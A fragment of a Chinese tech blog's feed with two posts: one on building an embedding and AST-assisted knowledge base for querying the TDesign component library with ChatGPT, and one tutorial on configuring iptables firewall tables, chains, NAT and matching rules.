    <content type="html"><![CDATA[<p>作者：腾讯前端开发工程师</p><blockquote><p>ChatGPT 是一种强大的自然语言处理模型。在工作中，我们可以借助其卓越的自然语言生成能力，快速检索代码信息，使程序员们能更加专注于业务逻辑的实现和优化。然而，由于它的知识库仅覆盖至 2021 年 9 月前的信息，一些新的技术文档无法被查询到，例如我们公司前端经常使用的开源框架 TDesign。本文讲解了本人为了解决这一痛点的实验过程，即通过应用 embedding 技术并结合 AST 解释器，实现了对 TDesign 代码知识库的自然语言查询。在 30 个常见用例的测试下，查询精度达到了 90%。常用组件的检索时间从平均 10 分钟缩短至 2 分钟，从而提升了前端研发效率 20%。</p></blockquote><h3 id="1-知识库搭建"><a href="#1-知识库搭建" class="headerlink" title="1. 知识库搭建"></a><strong>1. 知识库搭建</strong></h3><p>ChatGPT 的数据覆盖范围仅至 2021 年 9 月前，这意味着如果出现了 2021 年 9 月之后的新信息或技术，ChatGPT 可能无法提供准确的答案或建议。例如，前端开发中经常使用的公司开源项目 TDesign 就是一个例子：</p><p><img src="640.jpeg" alt="图片"></p><p>幸运的是，针对这个问题，业界已经提供了解决方案——构建知识库，一般有两种路径：</p><p>首选的方法是对开源的大型语言模型（LLM）进行全面或部分的微调，采用 fine-tune 或者 LoRA 技术。这种方法的优点在于，它能使 LLM“记住”特定的领域知识，从而在拥有特定知识背景的条件下进行交流，如“猫娘”或“客服机器人”等。此外，因为采用了私有部署，这种方案适合用于一些尚未公开的公司内部知识。然而，这种微调方案的缺点在于，它需要大量的 GPU 算力支持，且调试过程耗时较长。</p><p>第二种方法是利用嵌入技术（embedding）。通过嵌入模型，将特定知识转化为向量，然后将这些向量存入相应的向量数据库中。在查询阶段，通过相似度查询，匹配出关联的 topK 结果，然后将这些结果提供给 LLM，生成相应的答案。这种方法的优点在于，OpenAI 提供了对应的 text-ada-embedding-002 模型，价格合理，效果也相当出色。然而，其缺点是可能不适合处理内部数据，存在数据泄露的风险。这里我要特别提醒一下，数据安全，人人有责。大家在实践过程中一定要防止敏感数据泄露的风险。</p><p><strong>在对两种方案进行对比分析后：</strong></p><p>1、考虑到 TDesign 已经在公网开源，因此相关数据并不涉及敏感信息；</p><p>2、当前公司的算力资源较为紧张，且微调方案的调试时间成本偏高；</p><p>我最终决定选择<strong>embedding 方案</strong>进行实施。</p><p>最终效果如下：</p><p>Q: 在 TDesign 中，如何校验表单，写出代码：</p><p><img src="640-1690456315686-3.png" alt="图片"></p><h3 id="2-实现过程"><a href="#2-实现过程" class="headerlink" title="2. 实现过程"></a><strong>2. 实现过程</strong></h3><p>实现原理图</p><p><img src="640-1690456318547-6.jpeg" alt="图片"></p><p>这里面我着重讲一下数据准备和处理过程。</p><h4 id="1-数据格式："><a href="#1-数据格式：" class="headerlink" title="1. 数据格式："></a>1. 数据格式：</h4><p>这里主要参考了 github 上面的 MrRanedeer 项目：<a href="https://github.com/JushBJJ/Mr.-Ranedeer-AI-Tutor"> https://github.com/JushBJJ/Mr.-Ranedeer-AI-Tutor</a> ，借鉴他的知识描述方式和信息组织的格式，综合对比之后采用了 JSON 的数据格式；</p><p><img src="640-1690456320936-9.jpeg" alt="图片"></p><h4 id="2-数据准备："><a href="#2-数据准备：" class="headerlink" title="2. 数据准备："></a>2. 数据准备：</h4><p>我是直接从 TDesign 的官网(<a href="https://tdesign.tencent.com/vue-next/overview"> https://tdesign.tencent.com/vue-next/overview </a>)上，提取所需数据，选取的版本是适用于 vue3 的 tdesign-vue-next。</p><p>起初，我的计划是：组件文档说明 + 组件代码 few shots ，以让 chatGPT 直接理解相应组件的规则，然后生成相关的代码。然而，实践证明这种做法效果并不理想，即使结合 prompt 提示进行优化，其最终效果也相对有限。(原因估计是太多的特有名词模型理解不了，导致产生了幻觉(hullucination))</p><p><img src="640-1690456323929-12.jpeg" alt="图片"></p><p><strong>最后我决定直接利用 TDesign 中的场景描述和代码演示。</strong></p><p><img src="640-1690456325969-15.jpeg" alt="图片"></p><p>调整后的数据结构如下：<strong>组件 -&gt; 使用场景 -&gt; {场景描述 &amp; 代码}。</strong></p><p><img src="640-1690456328559-18.jpeg" alt="图片"></p><h4 id="3-数据向量化："><a href="#3-数据向量化：" class="headerlink" title="3. 数据向量化："></a>3. 数据向量化：</h4><p>我们将使用常见的 LLM 对接工具 Langchain 和它的 Text Splitter 工具。具体来说，我们使用的是<strong>RecursiveCharacterTextSpliter</strong>，它能在尽可能保证句子语义完整的前提下根据 ChunkSize 进行分段。但是由于 chunkSize 的局限和知识文章长度的不确定导致很多时候，切片后语义的丢失。比如：</p><p><code>&#123;&quot;小明的自我介绍&quot;: &quot;大家好叫小明,我的爱好是足球和绘画&quot;&#125;</code>，如果文本在小明这里被截断，后续搜索”小明的介绍”，大概率不会将”小明”和后面的”我的爱好是足球和绘画”的信息匹配到一起，而导致在数据召回阶段没办法得到准确的知识。</p><p>关于这一点的优化我会在后面说明。</p><h4 id="4-数据检索："><a href="#4-数据检索：" class="headerlink" title="4. 数据检索："></a>4. 数据检索：</h4><p>这个阶段主要是通过提出的问题，搜索向量数据库中匹配的信息，与系统 prompt 整合之后传给 openai competition 完成知识检索。</p><p>代码如下：</p><p><img src="640-1690456330821-21.jpeg" alt="图片"></p><p>使用的 prompt 如下：</p><p><img src="640-1690456332989-24.jpeg" alt="图片"></p><h3 id="3-效果展示"><a href="#3-效果展示" class="headerlink" title="3. 效果展示"></a><strong>3. 效果展示</strong></h3><p>在 30 个常见的问题中，一共存在 7 个 bad case(错误答案，存在大量幻觉(hullucination))，3 个 not perfect(回答正确，但是有瑕疵，比如上传图片实现为上传文件)，其余回答正确。正确率 20/30 = 66.7%，可用率 23/30 = 76.7%。</p><h4 id="原因分析："><a href="#原因分析：" class="headerlink" title="原因分析："></a>原因分析：</h4><ol><li>多维度知识匹配能力有限，比如同时检索 form,button,input,select 等组件组合的问题，由于 vectorStore.similaritySearch 过程中 topK 召回的数量有限，且 context 长度有限，会造成多维度知识检索的能力偏弱</li><li>知识切片不连贯导致的上下文信息丢失，正如上文提到的小明的例子</li></ol><p><code>&#123;&quot;小明的自我介绍&quot;: &quot;大家好叫小明,我的爱好是足球和绘画&quot;&#125;</code>，如果文本在小明这里被截断，后面的信息就丢失了”小明的自我介绍”的上下问信息，导致召回失败。</p><h3 id="4-方案优化"><a href="#4-方案优化" class="headerlink" title="4. 方案优化"></a><strong>4. 方案优化</strong></h3><p>1、针对上面提到两点影响因素，第一个方案可以通过优化 chunkSize 和 topK 的参数进行微调试错，但是总的来说当查询维度提升，所需的上下文信息也会相应增多，但这可能受到 LLM 的上下文长度限制的约束。关于这一点笔者写文章时已经拿到了 claude 100k 上下文的 api，会在未来进一步的测试</p><p>2、针对第二点切片的导致的上下问信息丢失，笔者想出的方案是：通过 JS 解释器将文档信息转换成 Javascript AST(抽象语法树)，每次切片记录当前索引所在的 scope 信息，从而标记出当前切片的上下文信息。(体验 AST:<a href="https://astexplorer.net/"> https://astexplorer.net/ </a>)</p><p>抽象语法树展示：</p><p><img src="640-1690456335177-27.jpeg" alt="图片"></p><p>可以看到在抽象语法树中，如果处理的是 JSON 对象，无论是 key 还是 value 都是能定位到他的字面量字符串的索引区间，所以只要知道我们每次分片的开始和结束的索引，我们就能定位到他在 AST 中的位置，当知道这个位置之后我们就可以通过算法回溯到当前片段的所有父级 key，也就是说只要我们的父级 key 足够语义化，我们上下文的信息就更加完整。</p><p>通过学习 langchain 中 RecursiveCharacterTextSpliter 的源码，我们是可以通过 indexChunk 的值得到每次切片时的索引。</p><p><img src="640-1690456337319-30.jpeg" alt="图片"></p><p>通过算法计算，可以得到每个切片的开头和结尾的一个上下文信息，效果如下：</p><p><img src="640-1690456339689-33.jpeg" alt="图片"></p><p>如果套用到前文提到的小明的例子的话，第二段”我的爱好是足球和绘画”的 scope 信息就是 {startScope: “小明的自我介绍”,endScope: “”},如果我们通过特定格式将他拼接到知识信息中去就会是：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">&gt; &gt; <span class="hljs-attr">startScopeStr</span>:<span class="hljs-string">&quot;小明的自我介绍&quot;</span>&lt;&lt;&lt;,我的爱好是足球和绘画&gt;&gt;&gt;<span class="hljs-attr">endScopeStr</span>:<span class="hljs-string">&quot;&quot;</span>&lt;&lt;&lt;</span><br></code></pre></td></tr></table></figure><p>现在如果使用”小明的兴趣爱好”来匹配并召回 embedding 片段，并喂给 LLM，就能得到准确的答案了。</p><p>最后可以在 prompt 中通过 few shots 进一步优化匹配，到此为止优化流程就完成了。</p><p><img src="640-1690456341460-36.jpeg" alt="图片"></p><h3 id="5-效果展示"><a href="#5-效果展示" class="headerlink" title="5. 效果展示"></a><strong>5. 效果展示</strong></h3><p>经过上述 AST 优化，最终得到了显著的优化结果，统计结果显示，错误答案(Bad Case)已减少至 3 个，回答尚有瑕疵(Not Perfect)的数量也降至 2 个。这样计算下来，正确率达到了 83.3%（25/30），可用率为 90%（27/30）。在当前样本集下，正确率提升了 15.6%，可用率也提升了 13.3%。</p><p>部分效果展示</p><p>Q: 如何实现带搜索框的穿梭框</p><p><img src="640-1690456343318-39.jpeg" alt="图片"></p><p>Q: 使用 TDesign,如何帮我实现一个圣杯布局：</p><p><img src="640-1690456345606-42.png" alt="图片"></p><h3 id="6-更多的思考"><a href="#6-更多的思考" class="headerlink" title="6. 更多的思考"></a><strong>6. 更多的思考</strong></h3><p>在整个实验中，我们可以看到，虽然通过 embedding 方案我们可以显著提升 ChatGPT 对新知识的理解和应用，但这仍然是一个逐步调优和改善的过程。这引发了我对于以下几个方向的思考：</p><ol><li>数据质量：项目中用到的高质量 TDesign 文档，但在处理更复杂的知识库时，数据质量可能下降。如何在复杂数据下保证数据质量是我们需要深思的问题；</li><li>测试评估：目前测试的方法不够标准化，无法量化的评估 embedding 的效果，需要制定可量化的评估标准；</li><li>多维度和长篇幅知识整合：对于涉及多个组件和上下文比较长的组件用例的查询，模型的处理能力有限。我们需要研究如何有效整合多维度和长下文的知识；</li><li>维护模型效果：随着知识库的更新和扩大，如何有效地更新模型以保持其在新知识上的表现是一个挑战;</li><li>数据安全：最后还是想要强调一下，切勿使用敏感数据和代码来进行处理，切勿泄露公司敏感信息。</li></ol><p><strong>引用</strong></p><p>[1]<a href="https://github.com/hwchase17/langchainjs">langchain.js ⚡ building applications with llms through composability ⚡</a></p><p>[2]<a href="https://tdesign.tencent.com/vue-next/getting-started">vue next for web tdesign 适配桌面端的组件库，适合在 vue3.x 技术栈项目中使用</a></p><p>[3] <a href="https://community.openai.com/t/the-length-of-the-embedding-contents/111471/12">https://community.openai.com/t/the-length-of-the-embedding-contents/111471/12</a></p><p>[4]<a href="https://github.com/JushBJJ/Mr.-Ranedeer-AI-Tutor"> https://github.com/jushbjj/mr.-ranedeer-ai-tutor</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>配置iptables防火墙</title>
    <link href="/2023/07/27/%E9%85%8D%E7%BD%AEiptables%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    <url>/2023/07/27/%E9%85%8D%E7%BD%AEiptables%E9%98%B2%E7%81%AB%E5%A2%99/</url>
    
    <content type="html"><![CDATA[<p><strong>壹</strong></p><p><strong>iptables常见概念</strong></p><p><img src="640.gif" alt="图片"></p><p><strong>iptables服务端：xuegod63.cn  IP：192.168.1.63</strong></p><p><strong>iptables客户端：xuegod64.cn  IP：192.168.1.64</strong></p><p><strong>一、iptables概述：</strong></p><p><strong>netfilter/iptables ：IP信息包过滤系统，它实际上由两个组件netfilter 和 iptables 组成。</strong></p><p><strong>netfilter/iptables 关系：</strong>            </p><p><strong>netfilter 组件也称为内核空间（kernelspace），是内核的一部分，由一些信息包过滤表组成，这些表包含内核用来控制信息包过滤处理的规则集。</strong></p><p><strong>iptables 组件是一种工具，也称为用户空间（userspace），它使插入、修改和除去信息包过滤表中的规则变得容易。</strong></p><p><strong>netfilter/iptables 后期简称为：iptables。iptables是基于内核的防火墙，功能非常强大，iptables内置了filter，nat和mangle三张表。所有规则配置后，立即生效，不需要重启服务。</strong></p><p><strong>二、三张表介绍：</strong></p><p><strong>filter负责过滤数据包，包括的规则链有，input，output和forward；</strong></p><p><strong>nat则涉及到网络地址转换，包括的规则链有，prerouting，postrouting和output；</strong></p><p><strong>mangle表则主要应用在修改数据包内容上，用来做流量整形的，给数据包打个标识，默认的规则链有：INPUT，OUTPUT、 forward，POSTROUTING，PREROUTING；</strong></p><p><strong>三、五个链：</strong></p><p><strong>input匹配目标IP是本机的数据包，</strong></p><p><strong>output 出口数据包 ， 一般不在此链上做配置</strong></p><p><strong>forward匹配流经本机的数据包，</strong></p><p><strong>prerouting用来修改目的地址，用来做DNAT 。如：把内网中的80端口映射到路由器外网端口上</strong></p><p><strong>postrouting用来修改源地址用来做SNAT。 如：内网通过路由器NAT转换功能实现内网PC机通过一个公网IP地址上网。</strong></p><p><strong>总结****：iptables三个表，5个链接，结构如图：</strong></p><p><img src="640-1690456058081-5.png" alt="图片"></p><p>Raw [rɔ:]表：用于处理异常，包括的规则链有，prerouting，output；一般使用不到。</p><p><strong>例：查看raw表中的内容：</strong></p><p><strong>[root@xuegod63 ~]# iptables -t raw -L</strong></p><p><strong>Chain PREROUTING (policy ACCEPT)</strong></p><p><strong>target   prot opt source        destination</strong>    </p><p><strong>Chain OUTPUT (policy ACCEPT)</strong></p><p><strong>target   prot opt source        destination</strong>   </p><p>表-&gt;链-&gt;规则</p><p>Iptables过滤封包流程</p><p><img src="640-1690456060607-8.png" alt="图片"></p><p><strong>–&gt;PREROUTING–&gt;[ROUTE]–&gt;FORWARD–&gt;POSTROUTING–&gt;</strong></p><p>   <strong>mangle     |    mangle            ^ mangle</strong></p><p>​    <strong>nat       |    filter              | nat</strong></p><p>​             <strong>|                 |</strong></p><p>​             <strong>|                 |</strong></p><p>​             <strong>v                 |</strong></p><p>​          <strong>INPUT             OUTPUT</strong></p><p>​             <strong>| mangle             ^ mangle</strong></p><p>​             <strong>| filter              | nat</strong></p><p>​            <strong>v —————-&gt;local————&gt;| filter</strong></p><p>**<br>**</p><p>**<br>**</p><p><strong>总结：</strong> 整体数据包分两类：1、发给防火墙本身的数据包 ；2、需要经过防火墙的数据包</p><p>① 当一个数据包进入网卡时，它首先进入PREROUTING链，内核根据数据包目的IP判断是否需要转送出去。 </p><p>② 如果数据包就是进入本机的，它就会沿着图向下移动，到达INPUT链。数据包到了INPUT链后，任何进程都会收到它。</p><p>本机上运行的程序可以发送数据包，这些数据包会经过OUTPUT链，然后到达POSTROUTING链输出。 </p><p>③ 如果数据包是要转发出去的，且内核允许转发，数据包就会如图所示向右移动，经过FORWARD链，然后到达POSTROUTING链输出。</p><p>**<br>**</p><p><img src="640-1690456065324-11.png" alt="图片"></p><p><strong>总结：</strong>整体数据包分两类：1、发给防火墙本身的数据包 ；2、需要经过防火墙的数据包</p><p>注意：规则的次序非常关键，谁的规则越严格，应该放的越靠前，而检查规则的时候，是按照从上往下的方式进行检查的。</p><p>**<br>**</p><p><strong>贰</strong></p><p><strong>iptables服务器安装及相关配置文件</strong></p><p><img src="640.gif" alt="图片"></p><p>Iptables部署</p><p>Iptables是逻辑性比较强的服务，所以我们一个一个的实验疏通</p><p><strong>一、安装</strong></p><p>–关闭firewall：</p><p>[root@localhost ~]# systemctl stop firewalld.service       #停止firewall<br>[root@localhost ~]# systemctl disable firewalld.service     #禁止firewall开机启动</p><p>–安装安装iptables防火墙</p><p>[root@localhost ~]# yum install iptables-services       #安装</p><p><strong>二、配置文件位置：</strong></p><p>[root@xuegod63 ~]# ls /etc/sysconfig/iptables</p><p>/etc/sysconfig/iptables</p><p><strong>三、启动服务</strong></p><p>[root@xuegod63 ~]# systemctl start iptables.service</p><p>[root@xuegod63 ~]# systemctl enable iptables.service</p><p><img src="640-1690456070143-16.png" alt="图片"></p><p><img src="640-1690456072602-19.png" alt="图片"></p><p><strong>叁</strong></p><p><strong>实战：iptables使用方法</strong></p><p><img src="640.gif" alt="图片"></p><p>例1：iptables命令使用方法</p><p>£ iptables [-t 要操作的表]</p><p>​     &lt;操作命令&gt;</p><p>​     [要操作的链]</p><p>​     [规则号码]</p><p>​     [匹配条件]</p><p>​     [-j 匹配到以后的动作]</p><p>£ 操作命令（-A、-I、-D、-P、-F）</p><p>£ 查看命令（-[vnx]L）</p><p><strong>-A &lt;链名&gt;  APPEND，追加一条规则（放到最后）</strong></p><p>例如：</p><p>  iptables -t filter -A INPUT -j DROP   #拒绝所有人访问服务器</p><p>  在 filter 表的 INPUT 链里追加一条规则（作为最后一条规则）</p><p>匹配所有访问本机 IP 的数据包，匹配到的丢弃</p><p><strong>-I &lt;链名&gt; [规则号码]   INSERT，插入一条规则</strong></p><p>例如：</p><p>  iptables -I INPUT -j DROP</p><p>  在 filter 表的 INPUT 链里插入一条规则（插入成第 1 条）</p><p>  iptables -I INPUT 3 -j DROP</p><p>  在 filter 表的 INPUT 链里插入一条规则（插入成第 3 条）</p><p>注意：1、-t filter 可不写，不写则自动默认是 filter 表</p><p>​    2、-I 链名 [规则号码]，如果不写规则号码，则默认是 1</p><p>​    3、确保规则号码 ≤ （已有规则数 + 1），否则报错</p><p><strong>-R num：Replays替换/修改第几条规则</strong></p><p>  格式：iptables –t filter -R INPUT 3 ………… 修改filter的INPUT链第三条规则</p><p><strong>-D &lt;链名&gt; &lt;规则号码 | 具体规则内容&gt;  DELETE，删除一条规则</strong></p><p>例如：</p><p>[root@xuegod63 ~]# iptables -L</p><p>Chain INPUT (policy ACCEPT)</p><p>target   prot opt source        destination    </p><p>DROP    all – anywhere       anywhere </p><p><strong>iptables -D INPUT 1（按号码匹配）</strong></p><p>删除 filter 表 INPUT 链中的第1条规则（不管它的内容是什么）</p><p>[root@xuegod63 ~]# iptables -L</p><p>Chain INPUT (policy ACCEPT)</p><p>target   prot opt source        destination    </p><p><strong>iptables -D INPUT -s 192.168.0.1 -j DROP（按内容匹配）</strong></p><p>  删除 filter 表 INPUT 链中内容为“-s 192.168.0.1 -j DROP”的规则</p><p>  （不管其位置在哪里）</p><p>注意：</p><p>  1、若规则列表中有多条相同的规则时，按内容匹配只删除序号最小的一条</p><p>  2、按号码匹配删除时，确保规则号码 ≤ 已有规则数，否则报错</p><p>  3、按内容匹配删除时，确保规则存在，否则报错</p><p><strong>-P &lt;链名&gt; &lt;动作&gt;  POLICY，设置某个链的默认规则</strong></p><p>例如：</p><p>[root@xuegod63 ~]# iptables -L  #查看默认规则是ACCEPT [əkˈsept]</p><p>Chain INPUT (policy ACCEPT)</p><p>target   prot opt source        destination </p><p> <strong>iptables -P INPUT DROP</strong></p><p> 设置 filter 表 INPUT 链的默认规则是 DROP</p><p>[root@xuegod63 ~]# iptables -L  #查看已经变为DROP</p><p>Chain INPUT (policy DROP)</p><p>target   prot opt source        destination  </p><p>注意：</p><p> 当数据包没有被规则列表里的任何规则匹配到时，按此默认规则处理。动作前面不能加 –j，这也是唯一一种匹配动作前面不加 –j 的情况。</p><p><strong>-F [链名]    FLUSH，清空规则</strong></p><p>例如：</p><p>添加规则：</p><p>[root@xuegod63 ~]# iptables -t filter -A INPUT -j DROP</p><p>[root@xuegod63 ~]# iptables -F INPUT  #清除INPUT链上的规则</p><p>[root@xuegod63 ~]# iptables -F  #清除filter表中所有链上的规则</p><p>[root@xuegod63 ~]# iptables -t nat -F #清空NAT表中  所有链上的规则</p><p>[root@xuegod63 ~]# iptables -t nat -F PREROUTING #清空NAT表中 PREROUTING链上的规则</p><p><strong>注意：</strong></p><p>  1、-F 仅仅是清空链中规则，并不影响 -P 设置的默认规则。需要手动改：</p><p>[root@xuegod63 ~]# iptables -P INPUT ACCEPT</p><p>  2、-P 设置了 DROP 后，使用 -F 一定要小心！！！</p><p><strong>##在生产环境中，使用-P DROP 这条规则，一定要小心，设置之前最好配置下面两个任务计划，否则容易把自己drop掉，链接不上远程主机。</strong></p><p>配置crontab :</p><p>*/15 * * * * iptables -P INPUT ACCEPT</p><p>*/15 * * * * iptables –F</p><p>  3、如果不写链名，默认清空某表里所有链里的所有规则</p><p><strong>-Z  将封包计数器归零</strong></p><p>iptables -Z INPUT</p><p><strong>-L [链名]    LIST，列出规则</strong></p><p>  v：显示详细信息，包括每条规则的匹配包数量和匹配字节数</p><p>  x：在 v 的基础上，禁止自动单位换算（K、M）</p><p>  n：只显示 IP 地址和端口号码，不显示域名和服务名称</p><p>   –line-number 可以查看到规则号</p><p>例如：</p><p>  iptables -L</p><p>  粗略列出 filter 表所有链及所有规则</p><p>  iptables -t nat -vnL</p><p>  用详细方式列出 nat 表所有链的所有规则，只显示 IP 地址和端口号</p><p>  iptables -t nat -vxnL PREROUTING</p><p>  用详细方式列出 nat 表 PREROUTING 链的所有规则以及详细数字，不反解</p><p>互动：  iptables -L  -n  可以执行成功</p><p>​      iptables -Ln  是否可以执行成功？</p><p>匹配条件</p><p>£ 流入、流出接口（-i、-o）</p><p>£ 来源、目的地址（-s、-d）</p><p>£ 协议类型   （-p）</p><p>£ 来源、目的端口（–sport、–dport）</p><p><strong>按网络接口匹配</strong></p><p>-i &lt;匹配数据进入的网络接口&gt;  #此参数主要应用于nat表，例如目标地址转换</p><p>例如：</p><p> -i eth0 </p><p>  匹配是否从网络接口 eth0 进来</p><p>  -i ppp0</p><p>  匹配是否从网络接口 ppp0 进来</p><p>-o 匹配数据流出的网络接口</p><p>例如：</p><p>  -o eth0</p><p>  -o ppp0</p><p><strong>按来源目的地址匹配</strong></p><p>-s &lt;匹配来源地址&gt;</p><p>  可以是 IP、 网段、域名，也可空（任何地址）</p><p>例如：</p><p>  -s 192.168.0.1   匹配来自 192.168.0.1 的数据包</p><p>  -s 192.168.1.0/24 匹配来自 192.168.1.0/24 网络的数据包</p><p>  -s 192.168.0.0/16 匹配来自 192.168.0.0/16 网络的数据包</p><p>-d &lt;匹配目的地址&gt;</p><p>  可以是 IP、 网段、域名，也可以空</p><p>例如：</p><p>  -d 202.106.0.20  匹配去往 202.106.0.20 的数据包</p><p>  -d 202.106.0.0/16 匹配去往 202.106.0.0/16 网络的数据包</p><p>  -d <a href="http://www.abc.com/">www.abc.com</a>   匹配去往域名 <a href="http://www.abc.com/">www.abc.com</a> 的数据包</p><p><strong>按协议类型匹配</strong></p><p>-p &lt;匹配协议类型&gt;</p><p>  可以是 TCP、UDP、ICMP 等，也可为空</p><p>例如：</p><p>  -p tcp</p><p>  -p udp</p><p>  -p icmp –icmp-type 类型</p><p>  ping: type 8   pong: type 0</p><p><strong>按来源目的端口匹配</strong></p><p>–sport &lt;匹配源端口&gt;</p><p>  可以是个别端口，可以是端口范围</p><p>例如：</p><p>  –sport 1000   匹配源端口是 1000 的数据包</p><p>  –sport 1000:3000 匹配源端口是 1000-3000 的数据包（含1000、3000）</p><p>  –sport :3000   匹配源端口是 3000 以下的数据包（含 3000）</p><p>  –sport 1000:   匹配源端口是 1000 以上的数据包（含 1000）</p><p>–dport &lt;匹配目的端口&gt;</p><p>  可以是个别端口，可以是端口范围</p><p>例如：</p><p>  –dport 80    匹配目的端口是 80 的数据包</p><p>  –dport 6000:8000 匹配目的端口是 6000-8000 的数据包（含6000、8000）</p><p>  –dport :3000   匹配目的端口是 3000 以下的数据包（含 3000）</p><p>  –dport 1000:   匹配目的端口是 1000 以上的数据包（含 1000）</p><p>注意：–sport 和 –dport 必须配合 -p 参数使用</p><p><strong>匹配应用举例</strong></p><p>1、端口匹配</p><p>-p udp –dport 53</p><p>匹配网络中目的端口是 53 的 UDP 协议数据包</p><p>2、地址匹配</p><p>-s 10.1.0.0/24 -d 172.17.0.0/16</p><p>匹配来自 10.1.0.0/24 去往 172.17.0.0/16 的所有数据包</p><p>3、端口和地址联合匹配</p><p>-s 192.168.0.1 -d <a href="http://www.abc.com/">www.abc.com</a> -p tcp –dport 80</p><p>匹配来自 192.168.0.1，去往 <a href="http://www.abc.com/">www.abc.com</a> 的 80 端口的 TCP 协议数据包</p><p><img src="640-1690456087361-24.png" alt="图片"></p><p><strong>注意：</strong></p><p>1、–sport、–dport 必须联合 -p 使用，必须指明协议类型是什么</p><p>2、条件写的越多，匹配越细致，匹配范围越小</p><p>4 动作（处理方式）</p><p>£ ACCEPT</p><p>£ DROP</p><p>£ SNAT</p><p>£ DNAT</p><p>£ MASQUERADE</p><p><strong>-j ACCEPT</strong></p><p>  通过，允许数据包通过本链而不拦截它</p><p>  例如：</p><p>  iptables -A INPUT -j ACCEPT</p><p>  允许所有访问本机 IP 的数据包通过</p><p><strong>-j DROP</strong></p><p>  丢弃，阻止数据包通过本链而丢弃它</p><p> 例如：</p><p>  iptables -A FORWARD -s 192.168.80.39 -j DROP</p><p>   阻止来源地址为 192.168.80.39 的数据包通过本机</p><p><strong>-j SNAT –to IP[-IP][:端口-端口]（nat 表的 POSTROUTING 链）</strong></p><p><strong>源地址转换</strong>，SNAT 支持转换为单 IP，也支持转换到 IP 地址池（一组连续的 IP 地址）</p><p>例如：</p><p> [root@xuegod63 ~]# iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -j SNAT –to 1.1.1.1</p><p>#将内网 192.168.0.0/24 的原地址修改为 1.1.1.1，用于 NAT</p><p>iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -j SNAT –to 1.1.1.1-1.1.1.10</p><p>同上，只不过修改成一个地址池里的 IP</p><p><strong>-j DNAT</strong> –to IP[-IP][:端口-端口]（nat 表的 PREROUTING 链）</p><p><strong>目的地址转换</strong>，DNAT 支持转换为单 IP，也支持转换到 IP 地址池</p><p>  （一组连续的 IP 地址）</p><p>例如：</p><p>表达方式1：把从 eth0 进来的要访问 TCP/80 的数据包目的地址改为 192.168.0.1.</p><p>[root@xuegod63 ~]# iptables -t nat -A PREROUTING -i eth0 -p tcp –dport 80 -j DNAT –to 192.168.0.1</p><p>表达方式2：</p><p>[root@xuegod63 ~]# iptables -t nat -A PREROUTING -i eth0 -p tcp –dport <strong>81</strong> -j DNAT –to 192.168.0.1:<strong>81</strong></p><p>表达方式3：把从 eth0 进来的要访问 TCP/80 的数据包目的地址改为 192.168.0.1-192.169.1.10</p><p>[root@xuegod63 ~]# iptables -t nat -A PREROUTING -i eth0 -p tcp –dport 80 -j DNAT –to 192.168.0.1-192.169.0.10</p><p><strong>-j MASQUERADE  伪装</strong></p><p>动态源地址转换（动态 IP 的情况下使用）</p><p>例如：</p><p>  [root@xuegod63 ~]# iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o eth0 -j MASQUERADE</p><p>将源地址是 192.168.0.0/24 的数据包进行地址伪装，转换成eth0上的IP地址。eth0为路由器外网出口IP地址</p><p><strong>肆</strong></p><p><strong>selinux概述-状态切换</strong> </p><p><img src="640-1690456100035-27.gif" alt="图片"></p><p><strong>附加模块</strong></p><p>£ 按包状态匹配  （state）</p><p>£ 按来源 MAC 匹配（mac）</p><p>£ 按包速率匹配  （limit）</p><p>£ 多端口匹配   （multiport）</p><p><strong>按包状态匹配  （state）</strong></p><p>-m state –state 状态</p><p>状态：NEW、RELATED、ESTABLISHED、INVALID</p><p>   NEW：有别于 tcp 的 syn  #如果我们发送一个流的初始化包，状态就会在OUTPUT链 里被设置为NEW，当我们收到回应的包时，状态就会在PREROUTING链里被设置为ESTABLISHED。如果第一个包不是本地产生的，那就会在PREROUTING链里被设置为NEW状 态。</p><p>   ESTABLISHED：连接态</p><p>   RELATED：衍生态，与 conntrack 关联（FTP）</p><p>   INVALID：不能被识别属于哪个连接或没有任何状态</p><p>例如：</p><p>  iptables -A INPUT -m state –state RELATED,ESTABLISHED -j ACCEPT</p><p>四个状态：</p><p><img src="640-1690456108092-29.png" alt="图片"></p><p>   这些状态可以一起使用，以便匹配数据包。这可以使我们的防火墙非常强壮和有效。以前，我们经常打 开1024以上的所有端口来放行应答的数据。现在，有了状态机制，就不需再这样了。因为我们可以只开放那些有应答数据的端口，其他的都可以关闭。这样就安全多了。</p><p><strong>按来源 MAC 匹配（mac）</strong></p><p>-m mac –mac-source MAC</p><p>匹配某个 MAC 地址</p><p>例如：</p><p>  iptables -A FORWARD -m mac –mac-source xx:xx:xx:xx:xx:xx -j DROP</p><p>  阻断来自某 MAC 地址的数据包，通过本机</p><p>注意：</p><p>​    报文经过路由后，数据包中原有的 mac 信息会被替换，所以在路由后的 iptables 中使用 mac 模块是没有意义的</p><p><strong>按包速率匹配  （limit）</strong></p><p>-m limit –limit 匹配速率 [–burst 缓冲数量]</p><p>  用一定速率去匹配数据包</p><p>例如：</p><p>  iptables -A FORWARD -d 192.168.0.1 -m limit –limit 50/s -j ACCEPT</p><p>  iptables -A FORWARD -d 192.168.0.1 -j DROP</p><p>注意：</p><p> limit 英语上看是限制的意思，但实际上只是按一定速率去匹配而已，50/s表示1秒中转发50个数据包，要想限制的话后面要再跟一条 DROP</p><p><strong>多端口匹配   （multiport）</strong></p><p>-m multiport &lt;–sports|–dports|–ports&gt; 端口1[,端口2,..,端口n]</p><p>一次性匹配多个端口，可以区分源端口，目的端口或不指定端口</p><p>例如：</p><p>  iptables -A INPUT -p tcp -m multiport –dports 21,22,25,80,110 -j ACCEPT</p><p><strong>注意：</strong></p><p>  必须与 -p 参数一起使用</p><p><strong>保存：service iptables save</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>防火墙</title>
    <link href="/2023/07/27/%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    <url>/2023/07/27/%E9%98%B2%E7%81%AB%E5%A2%99/</url>
    
